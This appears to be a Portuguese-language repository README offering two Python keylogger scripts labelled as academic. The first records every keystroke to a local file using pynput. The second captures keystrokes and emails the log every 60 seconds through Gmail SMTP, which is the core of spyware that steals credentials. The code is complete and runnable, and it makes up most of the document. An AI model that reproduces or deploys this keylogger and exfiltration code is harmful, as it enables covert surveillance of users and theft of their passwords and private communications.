# Monitoramento de Eventos do Teclado (Uso Acadêmico)

Este repositório contém dois exemplos de scripts em Python desenvolvidos **exclusivamente para fins educacionais**, com objetivo de demonstrar:

- Captura de eventos do teclado utilizando `pynput`
- Armazenamento de teclas em arquivo
- Processamento de teclas especiais
- Envio automático por e-mail usando SMTP (estudo de automação)
- Uso de Threads com `Timer`

# Requisitos

Instale as dependências:

pip install -r requisitos.txt
pynput

Script 1 — Registro de Teclas em Arquivo
from pynput import keyboard

IGNORAR = {
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.alt_l,
    keyboard.Key.alt_r,
    keyboard.Key.caps_lock,
    keyboard.Key.cmd
}

def on_press(key):
    try:
        with open("log.txt", "a", encoding="utf-8") as f:
            f.write(key.char)

    except AttributeError:
        with open("log.txt", "a", encoding="utf-8") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.tab:
                f.write("\t")
            elif key == keyboard.Key.backspace:
                f.write(" ")
            elif key == keyboard.Key.esc:
                f.write(" [ESC] ")
            elif key in IGNORAR:
                pass
            else:
                f.write(f"[{key}] ")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

Script 2 — Captura e Envio por E-mail

Este script captura teclas e envia periodicamente o conteúdo por e-mail.
O envio a cada tempos em tempos segundos demonstra:

 - Automação com Timer()
 - Uso do protocolo SMTP
 - Integração de captura + comunicação

from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

# Configurações (use variáveis de ambiente em produção)
EMAIL_ORIGEM = "seu_email@gmail.com"
EMAIL_DESTINO = "destino@gmail.com"
SENHA_EMAIL = "SUA_SENHA_AQUI"

log = ""

def enviar_mail():
    global log

    if log:
        msg = MIMEText(log)
        msg['Subject'] = "Dados capturados (Uso Acadêmico)"
        msg['From'] = EMAIL_ORIGEM
        msg['To'] = EMAIL_DESTINO

        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
            server.send_message(msg)
            server.quit()
        except Exception as e:
            print("Erro ao enviar:", e)

        log = ""

    Timer(60, enviar_mail).start()

def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\n"
        elif key == keyboard.Key.backspace:
            log += "[<]"
        else:
            pass  # Ignorar teclas de controle

with keyboard.Listener(on_press=on_press) as listener:
    enviar_mail()
    listener.join()


